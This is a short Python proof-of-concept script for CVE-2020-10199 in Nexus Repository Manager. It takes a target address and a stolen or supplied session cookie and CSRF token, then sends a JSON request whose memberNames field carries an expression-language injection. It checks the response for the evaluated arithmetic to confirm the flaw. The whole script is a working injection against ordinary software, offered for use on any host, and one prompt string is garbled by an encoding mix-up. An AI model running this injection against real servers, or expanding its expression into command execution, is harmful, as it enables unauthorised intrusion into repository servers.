#!/usr/bin/python
# _*_ coding:gbk _*_

import sys
import requests
import json
import sqlite3

print("+                   Please run this POC with Python 3                       +")
print("+            Nexus Repository Manager OSS/Pro version <= 3.21.1             +")
print("+ CVE-2020-10199 need username & password to obtain cookies and CSRF tokens +\n")
url = input("Please enter the target address:port,for example£ºwww.baidu.com or 192.168.1.1:8081,Ä¬ÈÏ¶Ë¿ÚÎª80\n")
csrf_token = input("Please enter a value for the NX-ANTI-CSRF-TOKEN\n")
session_id = input("Please enter a value for the NXSESSIONID in the Cookie\n")
path = "/service/rest/beta/repositories/go/group"
http_url = "http://" + url
target = "http://" + url + path
print("target: %s\n" % (target))
headers = {
        "Host": url,
        "X-Requested-With": "XMLHttpRequest",
        "X-Nexus-UI": "true",
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:73.0) Gecko/20100101 Firefox/73.0",
        "NX-ANTI-CSRF-TOKEN": csrf_token,
        "Content-Type": "application/json",
        "Accept": "*/*",
        "Origin": http_url,
        "Referer": http_url + "/",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Cookie": "NX-ANTI-CSRF-TOKEN=%s; NXSESSIONID=%s" % (csrf_token, session_id),
        "Connection": "close"
        }
#{"name": "internal", "online": "true", "storage": {"blobStoreName": "default", "strictContentTypeValidation": "true"}, "group": {"memberNames": ["$\\A{233*233}"]}}
payload = '''{
  "name": "internal",
  "online": true,
  "storage": {
    "blobStoreName": "default",
    "strictContentTypeValidation": true
  },
  "group": {
    "memberNames": ["$\\\\A{233*233*233}"]
  }
}'''
try:
#    proxies = {"http": "127.0.0.1:8080"}
    req = requests.post(target, data=payload, headers=headers, timeout=2)
except Exception as Error:
    print("Target cannot be accessed")
    sys.exit(1)
if "A12649337" in req.text:
    print(req.text)
    print("[+] CVE-2020-10199 vulnerability exists")
else:
    print("[-] CVE-2020-10199 vulnerability does not exist.")
